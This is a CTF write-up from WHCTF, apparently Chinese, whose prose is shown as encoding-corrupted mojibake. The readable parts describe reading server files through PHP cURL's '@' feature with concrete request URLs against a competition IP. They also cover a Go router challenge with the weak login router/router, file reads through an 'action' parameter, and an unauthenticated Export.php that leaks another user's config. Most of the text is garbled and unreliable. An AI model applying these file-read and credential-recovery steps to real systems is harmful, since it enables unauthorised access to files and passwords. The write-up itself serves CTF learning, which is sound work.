ç„¶åï¼Œå°±æ‰å…¥äº†å¤§å‘ğŸ˜¢ã€‚å‘ç°è¿™ä¸ªæ­£åˆ™å¤ªè‹›åˆ»äº†ï¼Œå‡ ä¹æ— æ³•è¿‡æ»¤ã€‚æ­¤å¤–ï¼Œä¹Ÿæ²¡æƒ³åˆ°å¾ˆå¥½çš„æ–¹æ³•ï¼Œé€šè¿‡gbkç¼–ç æ¥åƒæ‰\\ã€‚å¦‚æœæœ‰å¤§ç‰›æœ‰å¥½çš„æ€è·¯ï¼Œéº»çƒ¦ç•™è¨€å‘Šè¯‰æˆ‘ï¼Œä¸å°½æ„Ÿæ¿€ã€‚

åæ¥ï¼Œå®˜æ–¹ç»™äº†ä¸€ä¸ªæç¤ºï¼š

```
RTFM of PHP CURL===>>read the fuck manul of PHP CURL???
```

è¿™æ—¶å€™ï¼Œå¼€å§‹å…³æ³¨ç½‘ç«™å¥‡æ€ªçš„ç‚¹ã€‚è¿™ä¸ªç½‘ç«™å¾ˆå¥‡æ€ªï¼Œindex.phpçš„åç¼€ã€‚è€Œåå°æŠ¥çš„æ˜¯pythonçš„django debugé”™è¯¯ã€‚æ‰€ä»¥ï¼Œå¿…ç„¶æ˜¯ä¸€ä¸ªPHPè°ƒç”¨Pythonçš„ç«™ï¼ŒPHPé€šè¿‡æŸç§æ–¹å¼è°ƒç”¨Pythonçš„APIã€‚å†è”æƒ³æç¤ºï¼ŒçŒœæµ‹åå°æ­å»ºç»“æ„åº”è¯¥æ˜¯PHPé€šè¿‡Curlå‘djangoæ­å»ºçš„Pythonç«™æäº¤æ•°æ®ï¼ŒPythonå¤„ç†å®Œå†å°†æ•°æ®ä¼ å›ã€‚

ç„¶åï¼Œåˆ©ç”¨Curlçš„@ç‰¹æ€§ã€‚

![WechatIMG728](https://mo-xiaoxi.github.io/img/post/whctf/curl.jpeg)

åœ¨fuzzçš„æ—¶å€™ï¼Œå‘ç°å¯ä»¥é€šè¿‡@index.phpè¯»å–index.phpå†…å®¹ï¼Œå¾ˆç¥å¥‡ã€‚

ç„¶åï¼Œå°±ä¾æ¬¡å°è¯•è¯»å–äº†Pythonçš„ä¸€äº›æ–‡ä»¶ã€‚å¾ˆå¥‡æ€ªï¼Œ`http://120.55.42.243:20010/index.php?url=@/opt/api/dnsapi/views.py`å¯ä»¥è¯»å–ï¼Œ`http://120.55.42.243:20010/index.php?url=@/opt/api/dnsapi/utils.py`ä¸èƒ½ã€‚

> è®¤çœŸæƒ³äº†ä¸€ä¸‹ï¼Œè¿™é‡Œåº”è¯¥æ˜¯åˆ©ç”¨äº†Curlçš„@ç‰¹æ€§å’ŒPythonçš„encodeç¼–ç ã€‚ä½¿ç”¨@ä¼šå°†æ–‡ä»¶å†…å®¹å…¨éƒ¨ä¼ è¾“åˆ°Pythonçš„ç«™ï¼Œè€Œæ–‡ä»¶å†…å®¹å¦‚æœæœ‰ä¸­æ–‡å°±ä¼šencodeæŠ¥é”™ï¼Œå›æ˜¾åˆ°ç½‘é¡µã€‚utils.pyä¹‹æ‰€ä»¥æ²¡æŠ¥é”™æ˜¯å› ä¸ºå…¶å†…å®¹å…¨æ˜¯è‹±æ–‡çš„ï¼Œä¸ä¼šå¼•èµ·encodeæŠ¥é”™ã€‚

æ¥ä¸‹æ¥ï¼Œå›é¡¾äº†ä¸€ä¸‹æŠ¥é”™é¡µé¢ï¼Œå‘ç°æ•°æ®åº“è·¯å¾„æ˜¯å·²çŸ¥çš„ï¼Œå°è¯•è¯»äº†ä¸€æ³¢ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°flagï¼Œéƒ½ä¸ç”¨åŠ è½½æ•°æ®åº“ã€‚

![6](https://mo-xiaoxi.github.io/img/post/whctf/flag.png)

## ROUTER

é¦–å…ˆï¼Œä¸‹è½½é™„ä»¶ã€‚äºŒè¿›åˆ¶å¤§ä½¬è¯´æ˜¯ä¸€ä¸ªgoè¯­è¨€å†™çš„ä»£ç ï¼Œåœ¨IDAä¸­è£…ä¸€ä¸ª[æ’ä»¶](https://github.com/strazzere/golang_loader_assist)å°±å¯ä»¥çœ‹åˆ°ç¬¦å·è¡¨ï¼Œè¿›è¡Œè°ƒè¯•è§£æã€‚

è¿™æ˜¯ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå¯åŠ¨æ—¶è¯»å–settings.confã€‚ç™»é™†åï¼Œå¯ä»¥ä¿®æ”¹å¯†ç ã€‚ç™»å½•çš„å¯†ç æ˜¯ä¸€ä¸ªå¼±å¯†ç ï¼Œç”¨æˆ·routerï¼Œå¯†ç routerã€‚ï¼ˆå¼±å¯†ç å¯ä»¥ç”±é™æ€è°ƒè¯•è¯»å–ï¼‰è€Œä¸”ï¼Œç™»å½•ä»¥åå¯ä»¥åœ¨actionå‚æ•°è¯»å–å­˜åœ¨çš„æ–‡ä»¶ã€‚

![router](https://mo-xiaoxi.github.io/img/post/whctf/router.png)

åœ¨æœ¬åœ°æ–°å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œå†…å®¹ä¸º1212xxx

```bash
# moxiaoxi @ moxiaoxideMBP in ~/Desktop/CTF/WHCTF/ROUTER [21:11:55]
$ ls
a97870f7-ddae-427d-bb13-11c9f06d2cc4.Router
flag
settings.conf

# moxiaoxi @ moxiaoxideMBP in ~/Desktop/CTF/WHCTF/ROUTER [21:11:56]
$ cat flag
1212xxx
```



![action](https://mo-xiaoxi.github.io/img/post/whctf/action.png)

å¯ä»¥å‘ç°ï¼Œå¦‚æœç™»å½•äº†ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡actionè¿›è¡Œæ–‡ä»¶è¯»å–ã€‚

é‚£ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦è·å¾—è¿œç¨‹æœåŠ¡çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ä¸Šå»å³å¯ã€‚ï¼ˆå› ä¸ºè¿™é‡Œæœ‰æƒé™é™åˆ¶ï¼Œå¦‚æœæ²¡æœ‰ç™»å½•ï¼Œå°†æ— æ³•å¾—åˆ°æ“ä½œæ¥å£ã€‚æ“ä½œæ¥å£æ˜¯æŒ‡POSTçš„é¡µé¢ï¼Œç–‘ä¼¼POSTçš„é¡µé¢æ˜¯ç»è¿‡Cookieé€šè¿‡å“ˆå¸Œç®—çš„ï¼Œè€Œä¸”å¿…é¡»ç”¨æˆ·ç™»å½•ï¼‰

![router2](https://mo-xiaoxi.github.io/img/post/whctf/router2.png)





è€Œå¯ä»¥å‘ç°Export.phpæœªéªŒè¯æƒé™ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸‹è½½åˆ°ä¸Šä¸€ä¸ªäººçš„confæ–‡ä»¶ã€‚

è·å–è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç å°±æ˜¯ä¸€å¥ä¸Šä¸€ä¸ªäººçš„confï¼Œç„¶åä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•ï¼Œè·å¾—å‰ä¸€ä¸ªäººè®¾ç½®çš„passwdã€‚



















